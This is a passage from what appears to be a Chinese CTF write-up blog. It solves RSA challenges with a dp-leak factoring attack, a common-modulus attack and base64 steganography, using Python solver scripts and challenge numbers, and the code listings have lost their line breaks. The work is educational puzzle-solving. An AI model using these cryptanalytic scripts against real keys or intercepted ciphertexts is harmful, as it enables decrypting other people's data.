“由dp=d%(p-1)我们可以知道dp&lt;p-1,因此我们很容易得到k的上限要小于e，因此只需要遍历range(1,e) ,若n整除p,即可得到p,从而结束循环。” 我们已知e和dp，我们需要遍历循环k，使得k能被（e*dp - 1）整除，若当前k值满足条件，则 p = k + 1 引用大佬代码： 123456789101112131415161718192021222324252627import gmpy2import rsaimport binascii# from Crypto.Util.number import *p=0e=65537c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751dp=905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657n=248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113temp=dp*efor i in range(1,e) : if (temp-1)%i==0: # i+1 就是 p的值 x=(temp-1)//i+1 y=n%x if y==0: p=x break#'//'代表向下取整,'/'得到的是浮点数q=n//pd=gmpy2.invert(e,(p-1)*(q-1))key=rsa.PrivateKey(n,e,d,p,q)m=pow(c,d,n)#unhexlify()的作用是返回16进制数对应的字符串print(binascii.unhexlify(hex(m)[2:]))#print(long_to_bytes(m)) 共模攻击1ABlades的这篇文章讲的非常详细 假设有一条信息m，使用公钥加密信息（使用了相同的模数n): 12c1 = m ** e1 mod nc2 = m ** e2 mod n 就可以用密钥d1，d2来求解 12m = c1 ** d1 mod nm = c2 ** d2 mod n 因为e1,e2互质，即 1gcd(e1,e2)=1 根据扩展欧几里得算法（如果gcd(a, b) = c，则存在x, y，使得c = ax + by。） 则有 1e1*s1 + e2*s2 = 1 于是我们就能得到以下的公式： 1c1 ** s1 * c2 ** s2= m 推算过程： 1234(c1 ** s1 * c2 ** s2) mod n = ((m ** e1 mod n) ** s1 * (m ** e2 mod n) ** s2) mod n(c1 ** s1 * c2 ** s2) mod n = (m ** (e1 ** s1 + e2 ** s2)) mod n(c1 ** s1 * c2 ** s2) mod n = (m ** (1)) mod n c1 ** s1 * c2 ** s2= m 并且可以知道s1/s2皆为整数，且一正一负 RSA3 (共模攻击)题目中给出了两个e和两个c,一个n 了解原理之后，直接上代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243import gmpy2from Crypto.Util import number#扩展欧几里得算法def exgcd(m, n, x, y): if n == 0: x = 1 y = 0 return (m, x, y) a1 = b = 1 a = b1 = 0 c = m d = n q = int(c / d) r = c % d while r: c = d d = r t = a1 a1 = a a = t - q * a t = b1 b1 = b b = t - q * b q = int(c / d) r = c % d x = a y = b return (d, x, y)c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e1=11187289e2=9647291n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801ans=exgcd(e1,e2,0,0)s1=ans[1]s2=ans[2]#powmod()函数,分数取模也可以直接算m=(gmpy2.powmod(c1,s1,n)*gmpy2.powmod(c2,s2,n))%nprint(number.long_to_bytes(m)) 参考链接 RSA &amp; what (共模攻击+base64隐写)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import gmpy2from Crypto.Util.number import *import base64#扩展欧几里得算法def exgcd(m, n, x, y): if n == 0: x = 1 y = 0 return (m, x, y) a1 = b = 1 a = b1 = 0 c = m d = n q = int(c / d) r = c % d while r: c = d d = r t = a1 a1 = a a = t - q * a t = b1 b1 = b b = t - q * b q = int(c / d) r = c % d x = a y = b return (d, x, y)n=785095419718268286866508214304816985447077293766819398728046411166917810820484759314291028976498223661229395009474063173705162627037610993539617751905443039278227583504604808251931083818909467613277587874545761074364427549966555519371913859875313577282243053150056274667798049694695703660313532933165449312949725581708965417273055582216295994587600975970124811496270080896977076946000102701030260990598181466447208054713391526313700681341093922240317428173599031624125155188216489476825606191521182034969120343287691181300399683515414809262700457525876691808180257730351707673660380698973884642306898810000633684878715402823143549139850732982897459698089649561190746850698130299458080255582312696873149210028240898137822888492559957665067936573356367589784593119016624072433872744537432005911668494455733330689385141214653091888017782049043434862620306783436169856564175929871100669913438980899219579329897753233450934770193915434791427728636586218049874617231705308003720066269312729135764175698611068808404054125581540114956463603240222497919384691718744014002554201602395969312999994159599536026359879060218056496345745457493919771337601177449899066579857630036350871090452649830775029695488575574985078428560054253180863725364147e1 = 1697e2 = 599c1_1 = 412629526163150748619328091306742267675740578011800062477174189782151273970783531227579758540364970485350157944321579108232221072397135934034064481497887079641131808838242743811511451355024436983050572020925065644355566434625618133203024215941534926113892937988520918939061441606915556516246057349589921494351383160036280826024605351878408056180907759973804117263002554923041750587548819746346813966673034182913325507826219961923932100526305289894965216608254252188398580139545189681875824089456195044984585824938384521905334289906422454152976834867304693292466676355760173232407753256256317546190171995276258924613533179898467683358934751999655196790168438343198229183747091108262988777659858609744709324571850262293294975336628234767258858873839342596887193772615000676401522431518310648303975593582965021189182246986957349253156736526071639973844039068996404290548474640668851856078201093335425412842295604919065487301340901573809617549185106072798799159726375235125260509158832996701927878713084753334549129580912412168594170659605421750204835970231909591063407612779337478065175988365401590396247576709343727196106058477166945670117868989025903023998142850338956985816131805349549059377047477131270847579095628384569645636821650c1_2 = 494644347943710545224678831941589086572700792465459558770782213550069709458568349686998660541810166872034041584767487150140111151788221460027897193248273461607411027815984883969396220626358625041781558277804930212654296704055890683796941327712758797770820006623289146990000114915293539639766846910274034245607746230740851938158390562286057002223177609606376329007676845450142537930798148258428701466415483232670659815791064681384406494388237742330786225557303988025468036820082959712050733095860546860468575857084616069132051094882919253745234762029759124776348047587755897123575123506976140900565238840752841856713613368250071926171873213897914794115466890719123299469964019450899291410760762179836946570945555295288184698184555018368687708432612286248476073758067175481771199066581572870175460016017100414479346437034291784837132240891321931601494414908927713208448927221095745802380014441841139882391378410438764884597938773868771896252329517440068673532468372840830510218585255432000690265226016573313570977945083879214961394087065558376158826938257664840570952233832852869328785568175434516247720356520242602299510374317488182738732700078879665745909603766482100138001417023680647717824323143388857817595766172152883484274718248c1_3 = 152942283599728307168144137370127212672611894072038732126041098102628831053000986759260271210671922070555948023688596575415822984026159010574404359474670428678518262175033880513984372909748992727828381694416776740981021730545374002974037896534944567124543272737618380646771071804878796585983783360553761828325817820260204820004421979881871027255562690952334900616675606524933557440263648233514757200263521499508373975003431306847453046714027687108396945719803444444954079308404947126216395526551292104722047878178373207886033071857277857997932255251315982837892164421298202073945919187779856785892717251746704537315003771369737854896595170485152591013676942418134278534037654467840633528916812275267230155352077736583130992587670941654695382287023971261529987384520843829695778029311786431227409189019205818351911572757145556993606643464336196802350204616056286497246016800105003143046120608673496196758720552776772796609670537056331996894322779267635281472481559819839042424017171718303214059720568484939239370144038161541354254182769979771948759413102933987773401644506930205164891773826513161783736386604783484446345744957119469799231796368324927570694496679453313927562345656690240414624431304646248599226046524702364131095964335c1_4 = 79717988936247951265489157583697956031893477858854186991051529161879478488281744062318600470906120960002282886511477294555606503083169449335174864424180701080203993329996226566203834693869525797695969610065991941396723959032680019082506816443041598300477625793433080664346470586416385854692124426348587211026568667694805849554780794033764714016521711467557284846737236374990121316809833819996821592832639024026411520407330206281265390130763948165694574512140518775603040182029818771866749548761938870605590174330887949847420877829240131490902432602005681085180807294176837646062568094875766945890382971790015490163385088144673549085079635083262975154206269679142412897438231719704933258660779310737302680265445437771977749959110744959368586293082016067927548564967400845992380076107522755566531760628823374519718763740378295585535591752887339222947397184116326706799921515431185636740825707782742373783475781052674257292910213843986132987466810027275052416774693363446184518901899202502828670309452622347532932678874990809930682575738653876289384151496807194146308614368821006660626870989784697045160231069428458961107751207771093777394616856305293335603892178327520756554333365975114235981173451368131680404850832773147333013716920c1_5 = 123111353650401158556639983459870663057297871992927053886971224773529636525110628183715748795987525113177540092814119928708272290370336537110381023134637759740716140969662183269370676630325583385284994943164692397459103195434968057377474610500216801375394703781249039351368816958227409657934091741509357152328382960684515093945552479461382281913961956745154260686029997827565075768703774895750561575155143606297116391666385705899138085693913246313778033627210312268959737394553510894720099165193981333775907531107232556909478156441457899797515694348816961762796703443502856101079430585547997496001098926600499728389113862894833789669213630332988693669889340482430613291490613803204484751470676686041002772556117213612152322606737150858116122936539131795111263513114569794532805886643087299918196635113037777138666914296986040549274559835214505300618256105508764026461518876579387159881983544667258537064954616097750399839661065797883103731694314852301848272092388637114950059216922969842082648527035538090054093890365647676119748995243416337805666557501345234056968476142608491830438065401219751688687373709390057521910942736632126729711606256158399963682990881473178216060827021373776598901281958527655543318413664277921492723185984c1_6 = 36869806815936046911848195817405817350259890871483063184373728397968909458432625046025376290214729914038387534731762237978339011724858818860181178811639468996206294711495853807311240013786226884265118119546377272154555615363105236192878292703331473547623021744317034819416624562896226194523639793573028006666236271812390759036235867495803255905843636447252225413871038762657801345647584493917576263471587347202664391908570140389126903204602391093990827188675090199750617303773574821926387194478875191828814971296674530519321530805302667925998711835019806761133078403281404889374663875077339168901297819436499920958268483684335998301056068380228873524800383911402490807139268964095165069610454677558808756444381542173782815227920906224931028457073652453777424387873533280455944646592996920617956675786286711447540353883400282402551158169958389450168079568459656526911857835375748015814860506707921852997096156275804955989964215077733621769938075413007804223217091604613132253046399456747595300404564172224333936405545921819654435437072133387523533568472443532200069133022979195685683508297337961701169394794966256415112246587706103819620428258245999539040721929317130088874161577093962579487428358736401687123174207198251449851429295c2_1 = 592169079372093727306100216011395857825646323934289480976073629037543922902098120901138454462177159996376654176248238979132528728327590301098966139983157980612320563496546128644967731000716697705104079039156276714872147463350811303393260622707024952543509891692246246277965823414460326811240048060543656588688604452353899779068825120910282167004715339763187734797180326976132213325054697165320479166356562518029805927741656605174809726397565772271562066078076105491745903986597877400370206718954975288721072048333678609055008135809089304229015364348490924974097403734627265297637171818849461766523691595241613878709865506436588268999163342945070495338153600520537498539457396582804692959296612715752573140296135784933206146091436617979599749774330699946637591406356289409716084034451049094715202196203486088368791744107629271647320273259836915312794297246589501008666299165717722507702866033454215783240025504356157664454861755286285777763585177751796252655008206383024707883077513745863312079349790275094080707502392866946325796914450602264462588722052297430827681750827349094323968337670311272933785838850649376115667223821665435911506351891489985627506615492005617098615432522564204152887767244129985681083657783356557756654335186c2_2 = 373940646416832740878733255707567753033716583448402000789202767511920210382830343955553654111486728333980557319799362514960627879016797491389812007768832730979916230647641872759001906846747977631675704310179448857128160385701185892914523053669366534408863734305635222625590986006420486092550427301086984563126480814987024980594613542978310129247678826691418335300577577527951623696426435497835228167084738007750914270251001921329521479047662848650808989996085600197309361410863238526802127877523767262921515150984998560136647154865791163316503073285223966216441025637452229043510097323724381056976302288136843260163922706692913035222445496716008888946581535004546355744211680390731257309941902587303353139951102244865270295414474488798335404630458489706639805186573874814586736746232358849677477533671968344154242963289415569487579895910660999043578737461300406937828924818002658292769882181668784501439254131996848948120781562158861495883827848139425862249576454689133681009549361314460818658995959098228995702202268649635363105549975932395335076521137604288520082040121286614922986554652700056148966514178935952363036963217619879899671383604638416567950421350546204434902113156720006282720889591288850271076074941927715678306057176c2_3 = 527630926460622936571385649841758214453416849039412401087443444317101857090904711485538107058823056085840539073345920792871368232355475394571098380596835468509997340505604333730547799560998822989747473780307779717715522787724471724766494090783971030594671013168209717686720448579582618378459567979027822271918653169622428153856198907810040224340270362413432495029672123261375400927159831537760709974778708160583252613784358234858583174544777979242887938827573604837766801998381379999076416444683891078093889686055482709838668356120916040352123019019255084513769603803814947774554028717814638951416291274696771515474086351482107953150253616922787262398450376249126999644026382478413080973933173079111305142716133389111399235545279259017424722601848670061556859163943895466553927946412523750166582734005733378328468250568944945912238495877929717101722314678120172228493787964904072583905721074766711732215815561012960394537195757832959268603775112932862105945720853959285187521763557915356428113876893276879775603217718981852114599706699524551973934242045743122744146361596971245034059345915315495232135483464496114770357536576200511490922413208178149869347802988786513451486411409887164516065062084917556120712465074206435831498113605c2_4 = 8786437178698940322877889807009957616777351844979869726962356553244050911283984280960665761649310895230455072977431415102053987735969326553978994853162483051544656873294555116009995592043183070208706258164840540599577072097104139505857517663273929851202628854185356185647194933800084230503413037858893307713037149307477830536758283681093517617820169181420796105338681582230788318108428132051793761014952837330456262272828627355701464740578197966332613127307037255647286823496355917642353327912440019621838870388091824748629637425759125214639885130163183752378908729773517053259212525494555880921052679512582051516604297098204363525081039382358483926727008679327719083138865969291911863630382097160230960738043575559330264018212774424527719153248563876760067931499029384228993253862501939337758514377472011933279273181144830381169849387893799390755052093069179605579485710343655570028592595882436632426527654452895431758715126580164902410286422637215098476316042367916779431052267545769495994723721129943616294879642305545894912914632980455031755879087401575310699765408473606166727137934224515998416625122213056208800095077933103150699272650116151674702438463062734472714004926103668378506804002740045547964716693536349447660850580c2_5 = 205314962204511500352858372254132533167549960825498949618514841570703199264867431580754674275990554478140637041427842111391746883257447120035947621456863890934062044010795443059281736346976175772415034838334682726635263432655537852942177334888025283748611576171534251461847349566505628290587224150869640386437623371249743165260396675220683302142805646368906930575140628610003919131999295855501215111393294818218799982703289304596989070475000081175510085432290264502023736899104746316830742226946395027029820825791831870857382647221322734605026210073093918331247494307555600335550942340526536281372036612138713881098866303169425501998978400008829873080965592009371176208668290074288903681417933657472279670688597862835627506340169978450918788539270346340385928840299573889292189531738082166408734046381423516467694328971385421907314814283489322619386570046183556572383980777277173349209330683424343658179781015072259378576130442222984963071166207642585589822061597282467850868050737957726423713761694231879497037175627546427449730638216214828463003483408928375620315193290871300316930139260521382533279767663839278693750409419493280753368451508802658272220767624766390639285308433607255253282702383762149755935518922075584637512494819c2_6 = 271453634732502613378948161256470991260052778799128789839624515809143527363206813219580098196957510291648493698144497567392065251244844074992734669490296293997386198359280316655904691639367482203210051809125904410431506925238374843856343243276508280641059690938930957474434518308646618959004216831130099873532714372402117796666560677624822509159287675432413016478948594640872091688482149004426363946048517480052906306290126242866034249478040406351940088231081456109195799442996799641647167552689564613346415247906852055588498305665928450828756152103096629274760601528737639415361467941349982213641454967962723875032638267311935042334584913897338553953961877439389588793074211502597238465542889335363559052368180212013206172712561221352833891640659020253527584706465205486408990762759230842192028381048563437724528409174790022752557512795782713125166158329880702730769957185428522011430144840232256419113631679343171680631630775266488738173707357123139368825087043785842169049943237537188129367275730984789479909103397937113837824575137021012333461552176687570010445744268373840742899299977372834041925102853718964831225250407279578465008537542659673685686242773379131904890865110699190451534445434533919127658976874721029586168106207c1=412629526163150748619328091306742267675740578011800062477174189782151273970783531227579758540364970485350157944321579108232221072397135934034064481497887079641131808838242743811511451355024436983050572020925065644355566434625618133203024215941534926113892937988520918939061441606915556516246057349589921494351383160036280826024605351878408056180907759973804117263002554923041750587548819746346813966673034182913325507826219961923932100526305289894965216608254252188398580139545189681875824089456195044984585824938384521905334289906422454152976834867304693292466676355760173232407753256256317546190171995276258924613533179898467683358934751999655196790168438343198229183747091108262988777659858609744709324571850262293294975336628234767258858873839342596887193772615000676401522431518310648303975593582965021189182246986957349253156736526071639973844039068996404290548474640668851856078201093335425412842295604919065487301340901573809617549185106072798799159726375235125260509158832996701927878713084753334549129580912412168594170659605421750204835970231909591063407612779337478065175988365401590396247576709343727196106058477166945670117868989025903023998142850338956985816131805349549059377047477131270847579095628384569645636821650ce1=1697e2=599ans=exgcd(e1,e2,0,0)s1=ans[1]s2=ans[2]c1 = [c1_1,c1_2,c1_3,c1_4,c1_5,c1_6]c2 = [c2_1,c2_2,c2_3,c2_4,c2_5,c2_6]#powmod()函数,分数取模也可以直接算bases = &quot;&quot;for i in range(len(c1)): m = (gmpy2.powmod(c1[i],s1,n)*gmpy2.powmod(c2[i],s2,n)) % n bases += str(long_to_bytes(m),&quot;utf-8&quot;)# print(flag.replace(&quot;\\n&quot;,&quot;','&quot;))bases = ['VEhJUz==','RkxBR3==','SVN=','SElEREVOLo==','Q0FO','WU9V','RklORM==','SVT=','T1VUP4==','RE8=','WU9V','S05PV9==','QkFTRTY0P5==','WW91bmdD','VEhJTku=','WU9V','QVJF','Tk9U','VEhBVE==','RkFNSUxJQVI=','V0lUSO==','QkFTRTY0Lh==','QmFzZTY0','aXO=','YW==','Z3JvdXA=','b2b=','c2ltaWxhcn==','YmluYXJ5LXRvLXRleHR=','ZW5jb2Rpbme=','c2NoZW1lc0==','dGhhdD==','cmVwcmVzZW50','YmluYXJ5','ZGF0YW==','aW5=','YW6=','QVNDSUl=','c3RyaW5n','Zm9ybWF0','Ynk=','dHJhbnNsYXRpbmd=','aXS=','aW50b1==','YT==','cmFkaXgtNjQ=','cmVwcmVzZW50YXRpb24u','VGhl','dGVybc==','QmFzZTY0','b3JpZ2luYXRlc8==','ZnJvbd==','YY==','c3BlY2lmaWN=','TUlNRT==','Y29udGVudI==','dHJhbnNmZXI=','ZW5jb2Rpbmcu','VGhl','cGFydGljdWxhct==','c2V0','b2b=','NjR=','Y2hhcmFjdGVyc5==','Y2hvc2Vu','dG+=','cmVwcmVzZW50','dGhl','NjQ=','cGxhY2UtdmFsdWVz','Zm9y','dGhl','YmFzZd==','dmFyaWVz','YmV0d2Vlbt==','aW1wbGVtZW50YXRpb25zLp==','VGhl','Z2VuZXJhbI==','c3RyYXRlZ3n=','aXO=','dG9=','Y2hvb3Nl','NjR=','Y2hhcmFjdGVyc5==','dGhhdA==','YXJl','Ym90aN==','bWVtYmVyc5==','b2a=','YS==','c3Vic2V0','Y29tbW9u','dG8=','bW9zdM==','ZW5jb2RpbmdzLA==','YW5k','YWxzb8==','cHJpbnRhYmxlLg==','VGhpc9==','Y29tYmluYXRpb25=','bGVhdmVz','dGhl','ZGF0YW==','dW5saWtlbHk=','dG/=','YmV=','bW9kaWZpZWS=','aW5=','dHJhbnNpdE==','dGhyb3VnaN==','aW5mb3JtYXRpb26=','c3lzdGVtcyw=','c3VjaN==','YXM=','RS1tYWlsLD==','dGhhdA==','d2VyZQ==','dHJhZGl0aW9uYWxseQ==','bm90','OC1iaXQ=','Y2xlYW4uWzFd','Rm9y','ZXhhbXBsZSw=','TUlNRSdz','QmFzZTY0','aW1wbGVtZW50YXRpb24=','dXNlcw==','QahDWiw=','YahDeiw=','YW5k','MKhDOQ==','Zm9y','dGhl','Zmlyc3Q=','NjI=','dmFsdWVzLg==','T3RoZXI=','dmFyaWF0aW9ucw==','c2hhcmU=','dGhpcw==','cHJvcGVydHk=','YnV0','ZGlmZmVy','aW4=','dGhl','c3ltYm9scw==','Y2hvc2Vu','Zm9y','dGhl','bGFzdA==','dHdv','dmFsdWVzOw==','YW4=','ZXhhbXBsZQ==','aXM=','VVRGLTcu']flag = &quot;&quot;for i in bases: print(str(base64.b64decode(i))[2:-1],end = &quot; &quot;)# THIS FLAG IS HIDDEN. CAN YOU FIND IT OUT? DO YOU KNOW BASE64? YoungC THINK YOU ARE NOT THAT FAMILIAR WITH BASE64. Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding. The particular set of 64 characters chosen to represent the 64 place-values for the base varies between implementations. The general strategy is to choose 64 characters that are both members of a subset common to most encodings, and also printable. This combination leaves the data unlikely to be modified in transit through information systems, such as E-mail, that were traditionally not 8-bit clean.[1] For example, MIME's Base64 implementation uses A\\xa8CZ, a\\xa8Cz, and 0\\xa8C9 for the first 62 values. Other variations share this property but differ in the symbols chosen for the last two values; an example is UTF-7. 以为通过共模攻击求解bases，再base64解码就可以了，没想到还有隐藏的flag，没辙了 –更新– https://blog.csdn.net/qq_41956187/article/details/105592471 没想到竟然有base64隐写，颠覆了我的认知，怪不得会有那么多的换行…… 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import gmpy2from Crypto.Util.number import *import base64#扩展欧几里得算法def exgcd(m, n, x, y): if n == 0: x = 1 y = 0 return (m, x, y) a1 = b = 1 a = b1 = 0 c = m d = n q = int(c / d) r = c % d while r: c = d d = r t = a1 a1 = a a = t - q * a t = b1 b1 = b b = t - q * b q = int(c / d) r = c % d x = a y = b return (d, x, y)n=785095419718268286866508214304816985447077293766819398728046411166917810820484759314291028976498223661229395009474063173705162627037610993539617751905443039278227583504604808251931083818909467613277587874545761074364427549966555519371913859875313577282243053150056274667798049694695703660313532933165449312949725581708965417273055582216295994587600975970124811496270080896977076946000102701030260990598181466447208054713391526313700681341093922240317428173599031624125155188216489476825606191521182034969120343287691181300399683515414809262700457525876691808180257730351707673660380698973884642306898810000633684878715402823143549139850732982897459698089649561190746850698130299458080255582312696873149210028240898137822888492559957665067936573356367589784593119016624072433872744537432005911668494455733330689385141214653091888017782049043434862620306783436169856564175929871100669913438980899219579329897753233450934770193915434791427728636586218049874617231705308003720066269312729135764175698611068808404054125581540114956463603240222497919384691718744014002554201602395969312999994159599536026359879060218056496345745457493919771337601177449899066579857630036350871090452649830775029695488575574985078428560054253180863725364147e1 = 1697e2 = 599c1_1 = 412629526163150748619328091306742267675740578011800062477174189782151273970783531227579758540364970485350157944321579108232221072397135934034064481497887079641131808838242743811511451355024436983050572020925065644355566434625618133203024215941534926113892937988520918939061441606915556516246057349589921494351383160036280826024605351878408056180907759973804117263002554923041750587548819746346813966673034182913325507826219961923932100526305289894965216608254252188398580139545189681875824089456195044984585824938384521905334289906422454152976834867304693292466676355760173232407753256256317546190171995276258924613533179898467683358934751999655196790168438343198229183747091108262988777659858609744709324571850262293294975336628234767258858873839342596887193772615000676401522431518310648303975593582965021189182246986957349253156736526071639973844039068996404290548474640668851856078201093335425412842295604919065487301340901573809617549185106072798799159726375235125260509158832996701927878713084753334549129580912412168594170659605421750204835970231909591063407612779337478065175988365401590396247576709343727196106058477166945670117868989025903023998142850338956985816131805349549059377047477131270847579095628384569645636821650c1_2 = 494644347943710545224678831941589086572700792465459558770782213550069709458568349686998660541810166872034041584767487150140111151788221460027897193248273461607411027815984883969396220626358625041781558277804930212654296704055890683796941327712758797770820006623289146990000114915293539639766846910274034245607746230740851938158390562286057002223177609606376329007676845450142537930798148258428701466415483232670659815791064681384406494388237742330786225557303988025468036820082959712050733095860546860468575857084616069132051094882919253745234762029759124776348047587755897123575123506976140900565238840752841856713613368250071926171873213897914794115466890719123299469964019450899291410760762179836946570945555295288184698184555018368687708432612286248476073758067175481771199066581572870175460016017100414479346437034291784837132240891321931601494414908927713208448927221095745802380014441841139882391378410438764884597938773868771896252329517440068673532468372840830510218585255432000690265226016573313570977945083879214961394087065558376158826938257664840570952233832852869328785568175434516247720356520242602299510374317488182738732700078879665745909603766482100138001417023680647717824323143388857817595766172152883484274718248c1_3 = 152942283599728307168144137370127212672611894072038732126041098102628831053000986759260271210671922070555948023688596575415822984026159010574404359474670428678518262175033880513984372909748992727828381694416776740981021730545374002974037896534944567124543272737618380646771071804878796585983783360553761828325817820260204820004421979881871027255562690952334900616675606524933557440263648233514757200263521499508373975003431306847453046714027687108396945719803444444954079308404947126216395526551292104722047878178373207886033071857277857997932255251315982837892164421298202073945919187779856785892717251746704537315003771369737854896595170485152591013676942418134278534037654467840633528916812275267230155352077736583130992587670941654695382287023971261529987384520843829695778029311786431227409189019205818351911572757145556993606643464336196802350204616056286497246016800105003143046120608673496196758720552776772796609670537056331996894322779267635281472481559819839042424017171718303214059720568484939239370144038161541354254182769979771948759413102933987773401644506930205164891773826513161783736386604783484446345744957119469799231796368324927570694496679453313927562345656690240414624431304646248599226046524702364131095964335c1_4 = 79717988936247951265489157583697956031893477858854186991051529161879478488281744062318600470906120960002282886511477294555606503083169449335174864424180701080203993329996226566203834693869525797695969610065991941396723959032680019082506816443041598300477625793433080664346470586416385854692124426348587211026568667694805849554780794033764714016521711467557284846737236374990121316809833819996821592832639024026411520407330206281265390130763948165694574512140518775603040182029818771866749548761938870605590174330887949847420877829240131490902432602005681085180807294176837646062568094875766945890382971790015490163385088144673549085079635083262975154206269679142412897438231719704933258660779310737302680265445437771977749959110744959368586293082016067927548564967400845992380076107522755566531760628823374519718763740378295585535591752887339222947397184116326706799921515431185636740825707782742373783475781052674257292910213843986132987466810027275052416774693363446184518901899202502828670309452622347532932678874990809930682575738653876289384151496807194146308614368821006660626870989784697045160231069428458961107751207771093777394616856305293335603892178327520756554333365975114235981173451368131680404850832773147333013716920c1_5 = 123111353650401158556639983459870663057297871992927053886971224773529636525110628183715748795987525113177540092814119928708272290370336537110381023134637759740716140969662183269370676630325583385284994943164692397459103195434968057377474610500216801375394703781249039351368816958227409657934091741509357152328382960684515093945552479461382281913961956745154260686029997827565075768703774895750561575155143606297116391666385705899138085693913246313778033627210312268959737394553510894720099165193981333775907531107232556909478156441457899797515694348816961762796703443502856101079430585547997496001098926600499728389113862894833789669213630332988693669889340482430613291490613803204484751470676686041002772556117213612152322606737150858116122936539131795111263513114569794532805886643087299918196635113037777138666914296986040549274559835214505300618256105508764026461518876579387159881983544667258537064954616097750399839661065797883103731694314852301848272092388637114950059216922969842082648527035538090054093890365647676119748995243416337805666557501345234056968476142608491830438065401219751688687373709390057521910942736632126729711606256158399963682990881473178216060827021373776598901281958527655543318413664277921492723185984c1_6 = 36869806815936046911848195817405817350259890871483063184373728397968909458432625046025376290214729914038387534731762237978339011724858818860181178811639468996206294711495853807311240013786226884265118119546377272154555615363105236192878292703331473547623021744317034819416624562896226194523639793573028006666236271812390759036235867495803255905843636447252225413871038762657801345647584493917576263471587347202664391908570140389126903204602391093990827188675090199750617303773574821926387194478875191828814971296674530519321530805302667925998711835019806761133078403281404889374663875077339168901297819436499920958268483684335998301056068380228873524800383911402490807139268964095165069610454677558808756444381542173782815227920906224931028457073652453777424387873533280455944646592996920617956675786286711447540353883400282402551158169958389450168079568459656526911857835375748015814860506707921852997096156275804955989964215077733621769938075413007804223217091604613132253046399456747595300404564172224333936405545921819654435437072133387523533568472443532200069133022979195685683508297337961701169394794966256415112246587706103819620428258245999539040721929317130088874161577093962579487428358736401687123174207198251449851429295c2_1 = 592169079372093727306100216011395857825646323934289480976073629037543922902098120901138454462177159996376654176248238979132528728327590301098966139983157980612320563496546128644967731000716697705104079039156276714872147463350811303393260622707024952543509891692246246277965823414460326811240048060543656588688604452353899779068825120910282167004715339763187734797180326976132213325054697165320479166356562518029805927741656605174809726397565772271562066078076105491745903986597877400370206718954975288721072048333678609055008135809089304229015364348490924974097403734627265297637171818849461766523691595241613878709865506436588268999163342945070495338153600520537498539457396582804692959296612715752573140296135784933206146091436617979599749774330699946637591406356289409716084034451049094715202196203486088368791744107629271647320273259836915312794297246589501008666299165717722507702866033454215783240025504356157664454861755286285777763585177751796252655008206383024707883077513745863312079349790275094080707502392866946325796914450602264462588722052297430827681750827349094323968337670311272933785838850649376115667223821665435911506351891489985627506615492005617098615432522564204152887767244129985681083657783356557756654335186c2_2 = 373940646416832740878733255707567753033716583448402000789202767511920210382830343955553654111486728333980557319799362514960627879016797491389812007768832730979916230647641872759001906846747977631675704310179448857128160385701185892914523053669366534408863734305635222625590986006420486092550427301086984563126480814987024980594613542978310129247678826691418335300577577527951623696426435497835228167084738007750914270251001921329521479047662848650808989996085600197309361410863238526802127877523767262921515150984998560136647154865791163316503073285223966216441025637452229043510097323724381056976302288136843260163922706692913035222445496716008888946581535004546355744211680390731257309941902587303353139951102244865270295414474488798335404630458489706639805186573874814586736746232358849677477533671968344154242963289415569487579895910660999043578737461300406937828924818002658292769882181668784501439254131996848948120781562158861495883827848139425862249576454689133681009549361314460818658995959098228995702202268649635363105549975932395335076521137604288520082040121286614922986554652700056148966514178935952363036963217619879899671383604638416567950421350546204434902113156720006282720889591288850271076074941927715678306057176c2_3 = 527630926460622936571385649841758214453416849039412401087443444317101857090904711485538107058823056085840539073345920792871368232355475394571098380596835468509997340505604333730547799560998822989747473780307779717715522787724471724766494090783971030594671013168209717686720448579582618378459567979027822271918653169622428153856198907810040224340270362413432495029672123261375400927159831537760709974778708160583252613784358234858583174544777979242887938827573604837766801998381379999076416444683891078093889686055482709838668356120916040352123019019255084513769603803814947774554028717814638951416291274696771515474086351482107953150253616922787262398450376249126999644026382478413080973933173079111305142716133389111399235545279259017424722601848670061556859163943895466553927946412523750166582734005733378328468250568944945912238495877929717101722314678120172228493787964904072583905721074766711732215815561012960394537195757832959268603775112932862105945720853959285187521763557915356428113876893276879775603217718981852114599706699524551973934242045743122744146361596971245034059345915315495232135483464496114770357536576200511490922413208178149869347802988786513451486411409887164516065062084917556120712465074206435831498113605c2_4 = 